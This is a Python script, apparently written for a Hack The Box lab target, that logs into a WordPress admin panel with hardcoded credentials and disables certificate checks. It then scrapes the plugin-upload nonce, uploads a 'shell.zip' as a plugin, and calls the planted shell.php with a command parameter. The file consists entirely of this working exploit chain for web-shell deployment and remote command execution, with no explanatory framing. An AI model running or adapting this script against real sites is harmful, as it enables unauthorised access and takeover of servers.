import urllib.request
import urllib.parse
import http.cookiejar
import ssl
import re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx), urllib.request.HTTPCookieProcessor(cj))

# 1. Login
opener.open(urllib.request.Request("https://makesense.htb/wp-login.php", headers={'User-Agent': 'Mozilla/5.0'}))
login_data = urllib.parse.urlencode({
    'log': 'htb_admin',
    'pwd': 'AdminP@ssw0rd123!',
    'wp-submit': 'Log In',
    'redirect_to': 'https://makesense.htb/wp-admin/',
    'testcookie': '1'
}).encode('utf-8')
opener.open(urllib.request.Request("https://makesense.htb/wp-login.php", data=login_data, headers={'User-Agent': 'Mozilla/5.0'}))

# 2. Get plugin upload nonce
req_page = urllib.request.Request("https://makesense.htb/wp-admin/plugin-install.php?tab=upload", headers={'User-Agent': 'Mozilla/5.0'})
html = opener.open(req_page).read().decode('utf-8')
match = re.search(r'id="_wpnonce" name="_wpnonce" value="([^"]+)"', html)
if not match:
    print("Could not find upload nonce!")
    exit(1)
nonce = match.group(1)
print("Upload Nonce:", nonce)

# 3. Post plugin zip file
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
body = bytearray()
body.extend(f'--{boundary}\r\nContent-Disposition: form-data; name="_wpnonce"\r\n\r\n{nonce}\r\n'.encode('utf-8'))
body.extend(f'--{boundary}\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/wp-admin/plugin-install.php?tab=upload\r\n'.encode('utf-8'))
body.extend(f'--{boundary}\r\nContent-Disposition: form-data; name="plugininstallpage"\r\n\r\nupload\r\n'.encode('utf-8'))
body.extend(f'--{boundary}\r\nContent-Disposition: form-data; name="pluginzip"; filename="shell.zip"\r\nContent-Type: application/zip\r\n\r\n'.encode('utf-8'))
body.extend(open('shell.zip', 'rb').read())
body.extend(f'\r\n--{boundary}\r\nContent-Disposition: form-data; name="install-plugin-submit"\r\n\r\nInstall Now\r\n'.encode('utf-8'))
body.extend(f'--{boundary}--\r\n'.encode('utf-8'))

req_upload = urllib.request.Request(
    "https://makesense.htb/wp-admin/update.php?action=upload-plugin",
    data=bytes(body),
    headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': f'multipart/form-data; boundary={boundary}'
    }
)
upload_html = opener.open(req_upload).read().decode('utf-8')
print("Upload response snippet:", upload_html[:500])

# Activate plugin if needed or call shell directly
shell_url = "https://makesense.htb/wp-content/plugins/shell/shell.php?cmd=id"
print("Testing shell URL:", shell_url)
try:
    shell_res = urllib.request.urlopen(urllib.request.Request(shell_url, headers={'User-Agent': 'Mozilla/5.0'}), context=ctx).read().decode('utf-8')
    print("Shell Output:\n", shell_res)
except Exception as e:
    print("Error fetching shell:", e)
